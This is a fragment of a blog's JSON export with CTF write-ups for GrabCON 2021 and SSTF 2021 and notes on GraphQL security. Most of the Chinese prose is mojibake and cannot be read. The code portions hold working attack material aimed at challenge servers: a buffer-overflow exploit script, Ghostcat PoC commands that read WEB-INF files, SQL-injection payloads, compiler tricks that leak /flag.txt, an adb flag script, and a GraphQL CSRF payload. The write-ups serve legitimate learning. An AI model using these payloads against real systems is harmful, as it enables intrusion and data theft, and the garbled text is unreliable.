æ˜¯çº¯çŒœçš„\nGrabCON{03_09_2021}\nä½†æ˜¯çœ‹äº†wpä¹‹åå‘ç°è¿™ç¡®å®æœ‰æ­£è§„çš„åšæ³•ï¼Œä¸€ä¸ªå¼€æºå·¥å…·å«ProtOSINTï¼Œæ‰€ä½¿ç”¨çš„apiå¦‚ä¸‹\nhttps://api.protonmail.ch/pks/lookup?op=index\u0026amp;search=sc4ry_gh0st@protonmail.com æ‹¿åˆ°æ—¶é—´æˆ³1630658267ï¼Œå³Fri 3 September 2021 08:37:47 UTC\nOSINT/Victim 1  We got to know our victims is hiding somewhere. We got access to live CCTV camera of that place. Can you find zip code of that location?\nLive Camera\nGrabCON{zipcode}\nAuthor: CETACEAN\n ç»™äº†ä¸€ä¸ªæ‘„åƒå¤´çš„åœ°å€ï¼Œç”¨IP geolocation lookupæŸ¥ä¸€ä¸‹åœ°ç‚¹\nç”»é¢å³ä¸Šæœ‰ä¸ªåœ¨åŠ¨çš„ç¼†è½¦\nzipcode: 39031\nGrabCON{39031}\nOSINT/Website  My friend is having a website named, \u0026ldquo;Great Animals Here\u0026rdquo;. He have leaked the flag on his website. Can you find the flag?\nHint: He used free website builder tool to create his site. greatanimalshere\nAuthor: CETACEAN\n https://greatanimalshere.weebly.com/\nOSINT/The Tour(1)  w0nd3r50uL! I know her but she did something horrible! She recently switched to some free and open-source software for running self-hosted social networking services. Check out her profile and find the last location she visited when she felt hungry?\nAuthor : rey\n ç©ºçš„ï¼Œè¯•ä¸€ä¸‹wayback machine\nhttps://web.archive.org/web/20210904191920/https://www.reddit.com/user/w0nd3r50uL/ ä¹Ÿæ˜¯ç©ºçš„ï¼Œç”¨sherlockæŸ¥ä¸€ä¸‹\nåé¢çš„å†…å®¹å¯ä»¥è¯¦è§wpäº†ï¼Œå¾ˆå°‘åšOSINTï¼Œä½†æ˜¯æ„Ÿè§‰å¥½æœ‰æ„æ€ï¼Œå°±æ˜¯æ‰¾çš„å¥½éº»çƒ¦ï¼Œè„‘æ´å¥½å¤§ï¼Œä¸å®¹æ˜“å•Š\nOSINT/The Tour(2)  Can you find the flight number and the flight operator of the last flight that took her to the final destination? E.g. GrabCON{AF226_Air_France}\nAuthor : rey\n wp-\u0026gt;https://kashmir54.github.io/ctfs/GrabCON/#the-tour2\nMisc/Welcome  GrabCON{welcome_to_grabcon_2021}\n GrabCON{welcome_to_grabcon_2021}\nMisc/Discord  Join our discord server!\n æ†¨æ‰¹æœºå™¨äººï¼Œæˆ‘æ²¡ææ˜ç™½è¿™ä¸ªæ˜¯æ€ä¹ˆç©çš„\ntmd è¯•äº†å¥½ä¹… ç»“æœç«Ÿç„¶åœ¨#role\nGrabCON{s@n1ty_fl4g_1s_here}\nfxxxk\nMisc/YouTube  Find us on YouTube.\n GrabCON{th3_qu1ck_br0wn_f0x_jumps_0v3r_th3_lazy_d0g}\nMisc/Find me  Checkout author\u0026rsquo;s social media.\nAuthor: Offen5ive\n GrabCON{n0_fl4g_h3r3}\nCrypto/Warm-up  Mukesh used to drink and then smoke 5 times a day. He is now suffering form cancer his drink was 64 rupees and 32 rupees cigarette that costs to cheap for him. And he has this much of cancer now.\nAuthor: Offen5ive\n file:///D:/CyberChef_v9.30.0/CyberChef_v9.30.0.html#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)\u0026amp;input=UzAxWlJFTlhVMU5KVmtoR1VWWktVa3BhUmtaTk1sTkxTVFZLVkVOV1UweExWbFpZUVZsTFZFbGFUa1ZWVmxSTlMwcElSa2MyVTFkS1ZrcEhWMDFMV0V0YVExVlZWRU5YVGxKT1JsTlZTMWRPVWtkR1MwMUVWVXMxUzBkWFZsTkxTMXBEV0ZGVVExUk9VbGxGVDFWVVRFMVNURlpEVFV4RlNrNU1SMWMwUTBsTFdWbEVRMVJEV0V0V01rWk5WakpXVGtKS1JrMVNTMDlNUWt0SFYwNUVXa3RLVjBVMFZsTk9UbEpUUlZkV1ZFdExTa3hXUjAxQ1VrbE9URWRYTlVOUVMwNVhSa1ZTUTFkTFdraEZTVlZhVWs5Q1RVWkZNakpYUzFaS1ZFTlhVMHRMV2xaV1ZWSlRWVWRHVEVaTFZrTkdSMFpJVlRSU1UxWlFSa2RYV1ZSVFRVdE9WbFJMVkV0VFIwWlNWRUZWU2xGTlVrZEdTVlpVVFVzMVNrWk5WRXhhUzFwV1dFbFdNazVPVGt4Rk5GWlVTMHBLVEZaSlVreFJTbFpLUjFkTlMxUkxUVmxFVTFSRFZrNU9Na1ZSVmpKWFNscExSazFXVEZWS1RrcFVRMVZUUlV0YVYwVTBWakpUUjBKT1JrbFZVMWROVWt4R1RWSk1WVXBTU2xkWE5rTllTMGxaVmxWU1ExUkhRVmxWVDFaRFJrMVNUVVUwVmt0UFMwWktWRU5UVTBWTFdsZEdUVlpMVWtkR1UwVTJWa3hNVFZKTlZrdE5TMWROUmt0WFYwOUxSRXRGV1VaVlZVTldUazR5UlZGVldsSlBRa2RHVFZKTFQwczFTMVJCTTBOTlMwcFdXRkZUUTFoTFdsTkZTVlpNVEUxU1JGWkpNakl5U2xKTVIxZFVVMGhMU1ZsV1ZWTXlWMDVPVTBaSFZUTXlTa3BHUmtzeU0wVkxWa2xXVFZWVFZVdFNTMWhKVkRKWFIwSk9SazFXVERKS1NrMUdSVTFETWt0T1RFVkxVbE5YUzA1WFJVMVZRMUpPVGxORlQxWkVNa3BHTlVaUFZreE1SMFpLVkVGWFUwOUxXVmxWTkZKVFZFZEdXVVZKVmxKUlRsSktSVEl5V2xaS05VdEhWMDVMUjB0V1RFWlZWa05YVGswMFZVZFZNMHhNU2taR1N6SXpXVXRLU2xkWFUxTk1TMGxaVjBkTlMxSkhSa3BGV1ZaTVRFcGFUVlpMVmxOUFNsSkxWRUUxUTFOTE5VdFdSVlpEVjB0V1NFWk5WVkpSU1ZWWlJrMHlNa2RMV2twWFZWWlRTa3RhUzBSQlQwdFJTMUZaUkZOVlExSklWVFpSUFQwOVBRPT0K å…¨éƒ¨æ˜¯b64åŠ å¯† å¾ˆç®€å•äº†\nGrabCON{dayuum_s0n!}\n å¥½èœå¥½èœï¼Œå¼€å­¦äº† å¥¥é‡Œç»™\n","date":"2021-09-07T11:22:14+08:00","permalink":"https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/","section":"posts","tags":["wp"],"title":"GrabCONCTF2021 Wp"},{"categories":["CTF"],"contents":"https://research.samsung.com/sstf\nhttps://playground.sstf.site/challenges\nTutorial/Practice: Flag Submission SCTF{It_15_tim3_t0_hack!!}\nTutorial/BOF 101 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212261\u0026amp;authkey=%21AO4uYzudT40Rn_Y\u0026amp;em=2\nSCTF{n0w_U_R_B0F_3xpEr7}\nTutorial/BOF 102 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212251\u0026amp;authkey=%21AMhDJ94NiXLWqYs\u0026amp;em=2\nfrom telnetlib import Telnet tn = Telnet(\u0026#34;bof102.sstf.site\u0026#34;, 1337) tn.read_until(b\u0026#34;Name \u0026gt; \u0026#34;) tn.write(b\u0026#34;/bin/sh\u0026#34; + b\u0026#34;\\n\u0026#34;) payload = b\u0026#39;A\u0026#39;*20 payload += b\u0026#39;\\xe0\\x83\\x04\\x08\u0026#39; payload += b\u0026#39;C\u0026#39;*4 payload += b\u0026#39;\\x34\\xa0\\x04\\x08\u0026#39; tn.read_until(b\u0026#34; \u0026gt; \u0026#34;) tn.write(payload + b\u0026#39;\\n\u0026#39;) tn.interact() SCTF{B0F_A774ck_w1Th_arg5_1n_x86}\nTutorial/SQLi 101 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212257\u0026amp;authkey=%21ALtIE_cNe-XDn2o\u0026amp;em=2\nSCTF{th3_f1rs7_5t3p_t0_the_w3B_h4ckEr}\nTutorial/SQLi102 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212260\u0026amp;authkey=%21AGPulJniPCbx8v4\u0026amp;em=2\n\u0026lt;?php include \u0026#34;./config.php\u0026#34;; $succ = -1; if($_GET[\u0026#39;showsrc\u0026#39;]) { show_source(\u0026#34;step1.php\u0026#34;); die; } if($_GET[\u0026#39;searchkey\u0026#39;]) { $succ = 0; $query = \u0026#34;select * from books where title like \u0026#39;%\u0026#34;.$_GET[\u0026#39;searchkey\u0026#39;].\u0026#34;%\u0026#39;\u0026#34;; $db = dbconnect(\u0026#34;sqli102_step3\u0026#34;); $result = mysqli_query($db,$query); mysqli_close($db); if($result) { $rows = mysqli_num_rows($result); } } ?\u0026gt;SCTF{b451c_SQLi_5k1lls}\nTutorial/RC four https://www.geeksforgeeks.org/rc4-encryption-algorithm/\nhttps://onedrive.live.com/embed?resid=F7E83213DDD289C7%212253\u0026amp;authkey=%21AOekQp-wZMxDdfA\u0026amp;em=2\nTutorial/RSA 101 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212256\u0026amp;authkey=%21ANLCkvPBdXSb8Ko\u0026amp;em=2\nWeb/SW Expert Academy  Are you poor at algorithm coding? Here is amazing platform to enhance your coding skill!\n å¥½å®¶ä¼™ï¼Œæ¢¦å›å­¦cè¯­è¨€çš„æ—¶å€™ï¼Œçœ‹åˆ°è¿™ä¸ªéª°å­çš„æ¦‚ç‡åˆèƒ½æ¢¦å›é«˜ä¸‰æ•°å­¦çš„æ¦‚ç‡éƒ¨åˆ†\nä½†æ˜¯æï¼Œå®ƒå¹¶ä¸éœ€è¦ä½ å…·ä½“å†™å‡ºæ¥codeï¼Œæ ‡ç­”å·²ç»ç»™å‡ºï¼ˆè™½ç„¶æˆ‘æ†¨æ†¨çš„ä¸€å¼€å§‹æ²¡å‘ç°è‡ªå·±è¿˜å†™äº†ä¸€ä»½ï¼‰\nint a[12];for(int i=0;i\u0026lt;12;i++)scanf(\u0026#34;%d\u0026#34;,a+i);int ans=0;int mod=36;for(int i=0;i\u0026lt;6;i++)for(int j=6;j\u0026lt;12;j++)if(a[i]\u0026gt;a[j])ans++;for(int i=2;i\u0026lt;36;i++)while(ans\u0026gt;=i\u0026amp;\u0026amp;ans%i==0\u0026amp;\u0026amp;mod%i==0)ans/=i,mod/=i;printf(\u0026#34;%d/%d\u0026#34;,ans,mod); å½“ç„¶ç›´æ¥è®¿é—®/flag.txtåˆæ˜¯ä¸å¯ä»¥çš„\né—®é¢˜å°±è½¬åŒ–ä¸ºäº†å¦‚ä½•åœ¨è¾“å‡ºä¸ºç¬¦åˆæ ·ä¾‹è¦æ±‚çš„æ ‡å‡†è¾“å‡ºçš„æƒ…å†µä¸‹è¿˜èƒ½æ‰“å°ä¸€ä»½åœ°å€å·²çŸ¥çš„flag.txtå‡ºæ¥\nç”±äºgccæ—¢èƒ½ç¼–è¯‘cä¹Ÿå¯ä»¥ç¼–è¯‘c++ï¼Œè¿™é‡Œç”¨importæ¥ç»•è¿‡å¯¹includeçš„é™åˆ¶ï¼›è€Œå¯¹äº#çš„ç»•è¿‡å¯ä»¥å‚è§-\u0026gt;Digraphs and trigraphs\n??=import \u0026#34;/flag.txt\u0026#34; %:import \u0026#34;/flag.txt\u0026#34; ç›¸å½“äº#import \u0026ldquo;/flag.txt\u0026rdquo;ï¼Œä»gccç¼–è¯‘æ—¶çš„æŠ¥é”™ä¿¡æ¯å¯ä»¥å¾—åˆ°flag\næˆ–è€…ç”¨åæ–œæ +æ¢è¡Œçš„å½¢å¼\n??=incl\\ ude \u0026#34;/flag.txt\u0026#34; ä¹Ÿå¯ä»¥ç»•è¿‡å¯¹includeçš„è¿‡æ»¤\nSCTF{take-care-when-execute-unknown-code}\nâ€”â€”â€”â€”ç±»ä¼¼çš„é¢˜ä¹‹å‰åšè¿‡ä¸€ä¸ª[FireshellCTF2020]Caasï¼Œä¹Ÿæ˜¯é¢„å¤„ç†éå†æŠ¥é”™å‡ºflag\nâ€”â€”â€”â€”åœ¨çœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpä¹‹åçœ‹åˆ°äº†å¦ä¸€ç§è§£æ³•ï¼Œä»æœªè®¾æƒ³è¿‡çš„é“è·¯\nWeb/Poxe Center  how to get legendary poxemon?\n çœ‹äº†wpï¼Œç›´æ¥sqlmapä¸€æŠŠæ¢­\nä¸è¿‡å®˜æ–¹çš„é¢„æœŸè§£wpæ›´å¤æ‚ä¸€äº›ï¼š\nå…ˆçˆ†ç›®å½•/docs/\nè¿™ä¸ªç‰ˆæœ¬ä¸‹æœ‰CVE-2020-1938 - Ghostcatï¼Œç›¸å…³æ–‡ç« å‚è€ƒ-\u0026gt;ä¸è°ƒè¯•æºç é‡ç° Ghostcat æ¼æ´ (CVE-2020-1938)\nä½¿ç”¨å…¬å¼€çš„pocè¯»ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼Œä¹‹åå°†classåç¼–è¯‘è·å¾—javaæºæ–‡ä»¶ï¼ˆå®˜æ–¹pocç²¾ç®€äº†ä¸€äº›å†…å®¹ ä¸è¿‡å¤§å·®ä¸å·®ï¼‰\npython poc.py -p 31811 -f \u0026quot;/WEB-INF/web.xml\u0026quot; 127.0.0.1 python poc.py -p 31811 -f \u0026quot;/WEB-INF/classes/com/samsung/sctf/MainController.class\u0026quot; 127.0.0.1 python poc.py -p 31811 -f \u0026quot;/WEB-INF/classes/com/samsung/sctf/gochaMapper.class\u0026quot; 127.0.0.1 python poc.py -p 31811 -f \u0026quot;/WEB-INF/demo/WEB-INF/classes/mapper/gochaMapper.xml\u0026quot; 127.0.0.1 /WEB-INF/classes/mapper/gochaMapper.xmlæ˜¯è¿™æ ·çš„\nè¿™é‡Œçš„sortNameå’ŒsortFlagç›´æ¥æ‹¼æ¥è¿›sqlè¯­å¥ä¸­æ²¡æœ‰è¿‡æ»¤ï¼Œå°è¯•sqli\nsortName=(case%20when%20(select%20true)%20then%20BID%20else%20%270%27%20end)\u0026amp;sortFlag=desc sortName=(case when (select true) then poke_name else '0' end)\u0026amp;sortFlag=asc sortName=(case%20when%20(select%20false)%20then%20BID%20else%20%270%27%20end)\u0026amp;sortFlag=desc sortName=(case when (select false) then poke_name else '0' end)\u0026amp;sortFlag=asc sortName=random())dummy UNION SELECT'A','B','C','D','D','F',now(),'G','H','I' FROM(SELECT 1 sortFlag=NULL sortName=random())dummy UNION SELECT DD.\u0026quot;index\u0026quot;,DD.\u0026quot;name\u0026quot;,DD.first_attribute,DD.second_attribute,'XX','XX',now(),'XX','XX','XX' FROM( SELECT * from poke_info sortFlag=\u0026quot;\u0026quot; {G0tcH4_Gh0sT_c4t_iS_L3G3ND4Ry_P0k3}\nMisc/meLorean  There was a crazy Data Scientist who rectilinearly claimed mathematics can make miracles. He left a note and then disappeared. Help to decode it.\n ç»™å‡ºäº†ä¸€ä¸ªè¿™æ ·çš„æ–‡ä»¶ï¼Œå……æ»¡äº†äºŒç»´åæ ‡\nä¸€ä¸ªçº¿æ€§å›å½’çš„ç›¸å…³é—®é¢˜ï¼Œéœ€è¦ç”¨åˆ°pythonä¸­çš„sklearn.linear_modelè¿›è¡Œæ•°æ®å¤„ç†\nimport ast from sklearn.linear_model import LinearRegression r = LinearRegression() flag = [] with open(\u0026#34;dataset.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: for l in f: l = ast.literal_eval(l) X = [[i[0]] for i in l] y = [i[1] for i in l] r.fit(X, y) flag.append(chr(int(round(r.coef_[0])))) print(\u0026#34;\u0026#34;.join(flag)) SCTF{Pr0gre55_In_R3gr3ss}\nADBaby æ˜¯åœ¨çœ‹wpçš„æ—¶å€™æ³¨æ„åˆ°çš„é¢˜ï¼Œçœ‹äº†ä¸ªå¤§æ¦‚æµç¨‹ï¼ˆå…¶å®åªæ˜¯çœ¼ç†Ÿadbè€Œå·² èœé¸¡ åˆ«éª‚äº†ï¼‰ï¼Œæ‰€ä»¥ä¸‹é¢å°±æ˜¯å¤§æ¦‚ç¿»è¯‘ä¸€ä¸‹wpï¼Œå¾ˆæ°´\nå…ˆè¿æ¥ä¸Šadb connect adbaby.sstf.site:6666ï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªé­”æ”¹è¿‡çš„adbï¼Œå±è”½äº†shellå’Œä¸»è¦åŠŸèƒ½ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨push/pullï¼Œå±äºæ–‡ä»¶ç®¡ç†ç±»çš„å‘½ä»¤ï¼ˆå…¨éƒ¨æŒ‡ä»¤å‚è§-\u0026gt;ä½ ç¡®å®šå·²ç»æŒæ¡äº†adbçš„ä½¿ç”¨ï¼Ÿ\nadb pull /proc/self/exe adbabyæ‹¿åˆ°æ–‡ä»¶ç”¨IDAè¿›è¡Œåˆ†æï¼Œå¯ä»¥çœ‹åˆ°flagçš„è·¯å¾„åœ¨/data/local/tmp/flagå¤„ï¼Œä½†ç›´æ¥ç”¨adb pullæ˜¯ä¸å¯è¾¾çš„ï¼Œå› ä¸ºå¯¹./, ../, data, local, tmp, flagè¿™äº›å­—çœ¼è¿›è¡Œäº†è¿‡æ»¤\næœ‰ä¸€ä¸ªè‡ªå®šçš„serviceåä¸ºadb Flag Serviceï¼Œå¯¹è¾“å…¥çš„å¯†ç è¿›è¡Œæ£€æŸ¥ï¼Œmd5åå¼€å¤´æ˜¯0123456çš„è¯å°±å¯ä»¥æ‹¿åˆ°flagï¼Œç”¨è„šæœ¬è·‘ä¸€ä¸‹ 415349420009\nfrom adb import adb_commands device = adb_commands.AdbCommands() device.ConnectDevice(serial=\u0026#39;adbaby.sstf.site:6666\u0026#39;) conn = device.protocol_handler.Open(device._handle, b\u0026#39;flag:\u0026#39;) def sendafter(*args): print(device.protocol_handler.InteractiveShellCommand(conn, *args).decode()) sendafter() sendafter(\u0026#39;415349420009\u0026#39;) SCTF{Do_Uth1nk_th1s_1s_adb}\n","date":"2021-09-05T11:09:54+08:00","permalink":"https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/","section":"posts","tags":["wp"],"title":"SSCTF2021 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"GraphQLç®€è¿° GraphQLæ˜¯ä¸€ç§é’ˆå¯¹Graphï¼ˆå›¾çŠ¶æ•°æ®ï¼‰æŸ¥è¯¢å¾ˆæœ‰ä¼˜åŠ¿çš„Query Languageï¼ˆæŸ¥è¯¢è¯­è¨€ï¼‰ï¼Œè€Œæ¶‰åŠåˆ°å­˜å‚¨æ—¶å¯ä»¥é€‰æ‹©NoSQL, SQLæˆ–å…¶å®ƒä»»æ„å­˜å‚¨æ–¹å¼ï¼ˆä¾‹å¦‚æ–‡æœ¬æ–‡ä»¶ã€å­˜å†…å­˜é‡Œç­‰ï¼‰ï¼›è¿™æ˜¯ä¸€é—¨ä¾¿äºå‰åç«¯äº¤äº’çš„è¯­è¨€ï¼Œè€Œä¸æ˜¯ä¾¿äºåç«¯å’Œæ•°æ®åº“äº¤äº’çš„è¯­è¨€ã€‚\nåº”ç”¨GraphQLçš„ä¸€ä¸ªå¾ˆé‡è¦çš„å‰ææ˜¯åç«¯æ•°æ®å·²ç»ä»¥å›¾çš„ç»“æ„è¿›è¡Œä¿å­˜ï¼Œï¼ˆå¹¶ä¸”ä¸€å®šæƒ…å†µä¸‹å·²ç»è®¾ç½®å¥½åŸºäºéšç§çš„è®¿é—®æ§åˆ¶ æˆæƒä¸é‰´æƒï¼Œå¦åˆ™ä¼šç›´æ¥è¢«æ”»å‡»è€…æ‰§è¡Œé«˜å±æ“ä½œï¼‰ã€‚æ¯æ¬¡æŸ¥è¯¢æˆ–æ›´æ–°éƒ½æœ‰è‡ªå·±çš„æ ¹èŠ‚ç‚¹ï¼Œå¾—åˆ°çš„æ•°æ®æ˜¯æ ‘çŠ¶ç»“æ„ï¼›å¦‚æœå¸Œæœ›ä»¥å›¾çš„å½¢å¼å±•ç¤ºåˆ™å‰ç«¯ä¸èƒ½ç®€å•çš„å¯¹å…¶è¿›è¡Œç¼“å­˜ï¼Œé‚£å¿…é¡»ä½¿ç”¨ç›¸åº”çš„å­˜å‚¨æ•°æ®åº“ï¼Œé€šè¿‡é¡¶ç‚¹çš„IDæŠŠä¸åŒèŠ‚ç‚¹ä¹‹é—´çš„æŸäº›è¾¹é‡æ–°è¿æ¥èµ·æ¥ã€‚\nå¹¶ä¸æ˜¯æ‰€æœ‰åœºæ™¯éƒ½éœ€è¦è¿ç§»åˆ°GraphQLï¼Œå¦‚æœRESTful APIå·²ç»èƒ½æ»¡è¶³éœ€æ±‚çš„è¯ã€‚\n GraphQL is basically just sugar for a simply typed lambda calculus.\n å˜æ›´ - Mutations  three important things:\nmutations are just queries in different namespace, but do NOT mix them;\narguments require Input Objects, not normal Objects;\nuse xyzAttributes for anything you want to link, then let your backend sort out how to do the linking(just like any other system we currently use)\n å†…çœ - introspection GraphQL å…è®¸åœ¨æŸ¥è¯¢çš„ä»»ä½•ä½ç½®è¯·æ±‚ __typenameï¼Œä¸€ä¸ªå…ƒå­—æ®µ(Meta fields)ï¼Œä»¥è·å¾—é‚£ä¸ªä½ç½®çš„å¯¹è±¡ç±»å‹åç§°ã€‚\næˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æŸ¥è¯¢ __schema å­—æ®µæ¥å‘ GraphQL è¯¢é—®å“ªäº›ç±»å‹æ˜¯å¯ç”¨çš„ï¼Œç±»å‹æœ‰ä»¥ä¸‹è¿™äº›ï¼š\n Query, Character, Human, Episode, Droid - è¿™äº›æ˜¯æˆ‘ä»¬åœ¨ç±»å‹ç³»ç»Ÿä¸­å®šä¹‰çš„ç±»å‹ã€‚ String, Boolean - è¿™äº›æ˜¯å†…å»ºçš„æ ‡é‡ï¼Œç”±ç±»å‹ç³»ç»Ÿæä¾›ã€‚ __Schema, __Type, __TypeKind, __Field, __InputValue, __EnumValue, __Directive - è¿™äº›æœ‰ç€ä¸¤ä¸ªä¸‹åˆ’çº¿çš„ç±»å‹æ˜¯å†…çœç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ã€‚  æ•æ„Ÿä¿¡æ¯æ³„éœ²\u0026amp;è¶Šæƒ è‡ªåŠ¨æ–‡æ¡£ç”Ÿæˆ/è§£æ - graphdoc | graphql-playground | graphql-voyager \u0026hellip;\u0026hellip;\nç”±äºå¯¹å¯¹è±¡æˆ–å±æ€§çš„æƒé™æ§åˆ¶ä¸å®Œå–„ï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œæ¡ˆä¾‹ï¼šhackerone ä¸€ç³»åˆ—ä¿¡æ¯æ³„éœ²æ¼æ´\nåœ¨objects.typesä¸­å¯»æ‰¾æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚email, password, secretkey, token, licensekey, sessionç­‰ï¼Œå¤šå¤šå…³æ³¨åºŸå¼ƒå­—æ®µï¼ˆdeprecated fields)ã€‚å½“å­—æ®µè¢«åºŸå¼ƒåç›´æ¥ç”¨__typeåšå†…çœç¡®å®æŸ¥æ‰¾ä¸åˆ°ï¼Œä½†å½“æŒ‡å®šincludeDreprecated: trueæ—¶ï¼Œ__typeä»ç„¶å¯ä»¥å°†åºŸå¼ƒå­—æ®µæš´éœ²å‡ºæ¥ã€‚\nGraphQLçš„è®¤è¯æ–¹å¼ GraphQLå¹¶æ²¡æœ‰è§„å®šä»»ä½•èº«ä»½è®¤è¯å’Œæƒé™æ§åˆ¶çš„ç›¸å…³å†…å®¹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ›´çµæ´»çš„åœ¨åº”ç”¨ä¸­å®ç°å„ç§ç²’åº¦çš„è®¤è¯å’Œæƒé™ï¼›ä½†æ˜¯ä¹Ÿå¾ˆå®¹æ˜“å†™å‡ºä¸€äº›â€œè£¸å¥”â€çš„æ¥å£æˆ–æ— æ•ˆè®¤è¯æ— æ•ˆçš„æ¥å£ã€‚\nç‹¬ç«‹è®¤è¯ç»ˆç«¯ (RESTful) é€šç”¨ä¸”å®˜æ–¹æ¨èçš„æ–¹å¼ï¼Œå¦‚æœåç«¯æœ¬èº«æ”¯æŒRESTfulæˆ–æœ‰ä¸“é—¨çš„è®¤è¯æœåŠ¡å™¨ï¼Œå¯ä»¥ä¿®æ”¹å°‘é‡ä»£ç å®ç°GraphQLæ¥å£çš„è®¤è¯ã€‚\nä¸¾ä¾‹ï¼šæ·»åŠ jwtè®¤è¯\nåœ¨GraphQLå†…è®¤è¯ å¦‚æœGraphQLçš„åç«¯æ”¯æŒGraphQLä¸èƒ½æ”¯æŒRESTfulï¼Œæˆ–å…¨éƒ¨è¯·æ±‚éƒ½éœ€è¦ä½¿ç”¨GraphQLï¼Œä¹Ÿå¯ä»¥ç”¨æ„é€ ç›¸å…³çš„Query Schemaæ¥å£è¿”å›tokençš„å½¢å¼ã€‚\nä¸¾ä¾‹ï¼šæ„é€ loginçš„Query Schemaï¼Œåœ¨è¿”å›å€¼ä¸­æºå¸¦token\ntype Query{ login( username: String! password: String! ): LoginMsg type LoginMsg{ message: String token: String } } åœ¨resolverä¸­æä¾›ç™»å½•é€»è¾‘\nimport bcrypt from 'bcrptjs'; import jsonwebtoken from 'jsonwebtoken'; export const login = async(_, args, context) =\u0026gt; { const db = await context.getDb(); const{username, password} = args; const user = await db.collection('User').findOne({username: username}); if(await bcyrpt.compare(password, user.password)){ return{ message: 'Login success', token: jsonwebtoken.sign({ user: user, exp: Math.floor(Date.now() / 1000) + (60 * 60), }, 'your secret'), }; } } ç™»å½•æˆåŠŸå æˆ‘ä»¬æŠŠtokenè®¾ç½®åœ¨è¯·æ±‚å¤´ä¸­ï¼Œç»§ç»­è¯·æ±‚GraphQLçš„å…¶ä»–æ¥å£ï¼Œè¿™æ—¶éœ€è¦å¯¹ApolloServerè¿›è¡Œå¦‚ä¸‹é…ç½®\nconst server = new ApolloServer({ typeDefs: schemaText, resolvers: resolverMap, context: ({ ctx }) =\u0026gt; { const token = ctx.req.headers.authorization || ''; const user = getUser(token); return{ ...user, ...ctx, ...app.context }; }, }); å®ç°getUserå‡½æ•°\nconst getUser = (token) =\u0026gt; { let user = null; const parts = token.split(' '); if(parts.length === 2){ const scheme = parts[0]; const credentials = parts[1]; if(/^Bearer$/i.test(scheme)){ token = credentials; try{ user = jwt.verify(token, JWT_SECRET); console.log(user); }catch(e){ console.log(e); } } } return user } é…ç½®å¥½ApolloServeråï¼Œåœ¨resolverä¸­æ ¡éªŒuser\nimport {ApolloError, ForbiddenError, AuthenticationError} from 'apollo-server'; export const blogs = async(_, args, context) =\u0026gt; { const db = await context.getDb(); const user = context.user; if(!user){ throw new AuthenticationError('You must be logged in to see blogs'); } const {blogId} = args; const cursor = {}ï¼› if(blogId){ cursor['_id'] = blogId; } const blogs = await db .collection('blogs') .find(cursor) .sort({publishedAt: -1}) .toArray(); return blogs; } æ›´å¤šå®‰å…¨æ¼æ´ Express-GraphQLï¼š\n æ¡†æ¶é»˜è®¤æ— é˜²æŠ¤ è‡ªå¸¦GraphiQL  Graphene-Djangoï¼š\n ä¾èµ–Djangoçš„å®‰å…¨é…ç½®ï¼ˆSecure As Defaultï¼‰ è‡ªå¸¦GraphiQL  GraphQL-PHP\n æ— å…³æ¡†æ¶  Express-GraphQL Endpoint CSRFæ¼æ´ {\u0026quot;query\u0026quot;:\u0026quot;mutation {\\n editProfile(name:\\\u0026quot;hacker\\\u0026quot;, age: 5) {\\n name\\n age\\n }\\n}\u0026quot;,\u0026quot;variables\u0026quot;:null} å°†Content-Typeä¿®æ”¹ä¸ºapplication/x-www-form-urlencodeï¼Œä»å¯æˆåŠŸæ‰§è¡Œ\nquery=mutation%20%7B%0A%20%20editProfile(name%3A%22hacker%22%2C%20age%3A%20 5)%20%7B%0A%20%20%20%20name%0A%20%20%20%20age%0A%20%20%7D%0A%7D ç›´æ¥é…åˆburpè‡ªå¸¦çš„Generate CSRD POC\nGraphiQL Clickjacking æ¼æ´ å‚è§ï¼šhttps://github.com/graphql/graphiql/issues/683\nå¯ä»¥é…åˆburpè‡ªå¸¦çš„Clickbanditè¿›è¡Œæ”»å‡»\nGraphQL injection æ¼æ´ è¿™æ˜¯ä¸€ä¸ªç›¸å½“å…¨çš„payloads\u0026amp;exps | è¿™æ˜¯ä¸€ä¸ªè‡ªçœpayload\npç¥ppté‡Œçš„ç¤ºæ„å›¾ç›´æ¥æ¬è¿‡æ¥äº†\nä»ç„¶æ˜¯æ‹¼æ¥äº†æ¶æ„çš„GraphQLè¯­å¥å¯¼è‡´æ¼æ´çš„å‘ç”Ÿï¼Œæœ¬è´¨è¿˜æ˜¯å¯¹ç”¨æˆ·è¾“å…¥çš„æ§åˆ¶ä¸ä¸¥æ ¼ï¼›åŒç±»çš„æ¼æ´è¿˜æœ‰xss, rceç­‰ç­‰\n æœ‰è¯­æ³•å°±æœ‰è§£æï¼Œæœ‰è§£æå°±ä¼šæœ‰ç»“æ„å’Œé¡ºåºï¼Œæœ‰ç»“æ„å’Œé¡ºåºå°±ä¼šæœ‰æ³¨å…¥ã€‚\n ç”¨â€œå‚æ•°åŒ–æŸ¥è¯¢â€çš„æ–¹å¼æ¥è§£å†³ä¸Šè¿°é—®é¢˜æ—¶ï¼Œè¦ç¡®ä¿åç«¯çš„è§£æå¼•æ“æ²¡æœ‰å¤§ç—…\né€šè¿‡Custom Scalarçš„æ³¨å…¥ (JSON)  NoSQL Injection is entirely possible when using GraphQL, and can creep into your application through the use of \u0026lsquo;custom scalar types\u0026rsquo;\n 